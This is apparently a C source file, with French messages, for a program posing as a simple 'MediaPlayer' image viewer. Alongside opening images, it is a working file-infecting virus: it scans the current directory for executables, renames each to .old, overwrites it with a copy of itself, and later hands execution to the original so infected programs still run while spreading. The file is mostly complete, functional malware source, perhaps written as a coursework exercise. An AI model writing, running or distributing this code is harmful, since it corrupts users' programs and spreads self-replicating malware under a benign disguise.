#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

#define NB_IMAGES 5
#define MAX_PATH 256

const char *imgFichiers[NB_IMAGES] = {"images/image1.jpeg","images/image2.jpeg","images/image3.jpeg","images/image4.jpg","images/image5.jpg"};

void MediaPlayer() {
    int imgActu = 0;
    char input[10];
    printf("MediaPlayer démarré. Utilisez les commandes suivantes :\n 'n' : Image suivante\n 'p' : Image précédente\n 'q' : Quitter\n");
    while (1) {
        char command[MAX_PATH + 20];
        snprintf(command, sizeof(command), "xdg-open %s", imgFichiers[imgActu]);
        int result = system(command);
        if (result != 0) printf("Erreur : Impossible d'ouvrir %s. Vérifiez le chemin.\n", imgFichiers[imgActu]);
        printf("Commande (n/p/q) : ");
        if (fgets(input, sizeof(input), stdin) == NULL) {printf("Erreur de lecture de l'entrée.\n");break;}
        if (input[0] == 'n') imgActu = (imgActu + 1) % NB_IMAGES;
        else if (input[0] == 'p') imgActu = (imgActu - 1 + NB_IMAGES) % NB_IMAGES;
        else if (input[0] == 'q') {printf("Arrêt du MediaPlayer.\n");break;}
        else printf("Commande invalide. Utilisez 'n', 'p' ou 'q'.\n");
    }
}

int isInfected(const char *filename) {
    const char *ext = strrchr(filename, '.');
    return (ext != NULL && strcmp(ext, ".old") == 0);
}

void infectFile(const char *filename) {
    char oldName[MAX_PATH];
    snprintf(oldName, MAX_PATH, "%s.old", filename);
    if (access(oldName, F_OK) == 0) {printf("%s est déjà infecté (version .old existe).\n", filename);return;}
    if (rename(filename, oldName) != 0) {perror("Erreur lors du renommage");return;}
    chmod(oldName, S_IRUSR | S_IWUSR | S_IXUSR);
    char command[MAX_PATH + 50];
    snprintf(command, sizeof(command), "cp ./MediaPlayer %s", filename);
    if (system(command) != 0) {perror("Erreur lors de la duplication");return;}
    chmod(filename, S_IRUSR | S_IWUSR | S_IXUSR);
    printf("Infection réussie : %s -> %s\n", filename, oldName);
}

void findAndInfectTargets() {
    DIR *dir = opendir(".");
    if (!dir) {perror("Erreur lors de l'ouverture du répertoire");return;}
    struct dirent *entry;
    struct stat fileStat;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0 || strcmp(entry->d_name, "MediaPlayer") == 0) continue;
        if (isInfected(entry->d_name)) continue;
        if (stat(entry->d_name, &fileStat) == -1) {perror("Erreur lors de la récupération du statut");continue;}
        if (S_ISREG(fileStat.st_mode) && (fileStat.st_mode & S_IXUSR)) infectFile(entry->d_name);
    }
    closedir(dir);
}

void transferExecution(int argc, char *argv[]) {
    char originalName[MAX_PATH];
    snprintf(originalName, MAX_PATH, "%s.old", argv[0]);
    if (access(originalName, F_OK) == 0) {
        printf("Exécution du programme original : %s\n", originalName);
        execv(originalName, argv);
        perror("Erreur lors du transfert d'exécution");
    } else printf("Fichier original %s introuvable.\n", originalName);
}

int main(int argc, char *argv[]) {
    char *programName = strrchr(argv[0], '/');
    if (programName == NULL) programName = argv[0];
    else programName++;
    if (strcmp(programName, "MediaPlayer") == 0) {
        printf("Lancement de MediaPlayer...\n");
        MediaPlayer();
        printf("Recherche et infection des fichiers exécutables...\n");
        findAndInfectTargets();
    } else {
        printf("Programme infecté (%s) : Propagation du virus...\n", programName);
        findAndInfectTargets();
        transferExecution(argc, argv);
        return 0;
    }
    transferExecution(argc, argv);
    printf("Exécution terminée.\n");
    return 0;
}